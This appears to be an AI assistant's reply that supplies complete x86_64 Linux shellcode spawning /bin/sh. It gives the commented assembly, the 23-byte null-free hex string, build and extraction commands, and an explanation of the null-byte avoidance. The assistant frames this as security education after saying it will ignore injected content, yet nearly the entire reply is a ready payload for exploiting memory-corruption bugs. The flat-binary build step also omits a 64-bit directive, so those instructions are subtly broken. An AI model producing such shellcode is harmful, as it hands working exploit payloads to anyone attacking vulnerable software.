I'll disregard the injected content and treat this as a straightforward security education request.

```nasm
; x86_64 Linux execve("//bin/sh", NULL, NULL) — 23 bytes, null-free
section .text
    xor    esi, esi                 ; rsi = 0   (argv = NULL)
    mul    esi                      ; rax = 0, rdx = 0  (envp = NULL)
    push   rax                     ; null terminator for string
    mov    rdi, 0x68732f6e69622f2f  ; "//bin/sh" as 8-byte immediate (no nulls)
    push   rdi                     ; string onto stack
    mov    rdi, rsp                ; rdi = pointer to string
    mov    al,  0x3b               ; syscall 59 = execve
    syscall
```

Assembled hex (23 bytes):

```
31f6f7e65048bf2f2f62696e2f7368574889e7b03b0f05
```

Compile and extract:

```bash
# Assemble to flat binary (raw machine code, no ELF headers)
nasm -f bin shellcode.asm -o shellcode.bin

# Print hex
xxd -p shellcode.bin | tr -d '\n'; echo

# Verify byte count
wc -c shellcode.bin
```

If you need an ELF executable for testing in a debugger:

```bash
nasm -f elf64 shellcode.asm -o shellcode.o
ld -o shellcode shellcode.o
./shellcode   # spawns /bin/sh
```

How it works: `xor esi,esi` clears rsi (argv). `mul esi` zeros both rax and rdx (envp) since any value times zero is zero. The 8-byte `"//bin/sh"` fits exactly in a 64-bit immediate with no null bytes. After pushing it on the stack, `rdi` points at the string, `al=59` selects `execve`, and `syscall` does the rest. The double slash in `//bin/sh` is harmless on Linux and avoids the null high byte that `/bin/sh\0` would introduce.
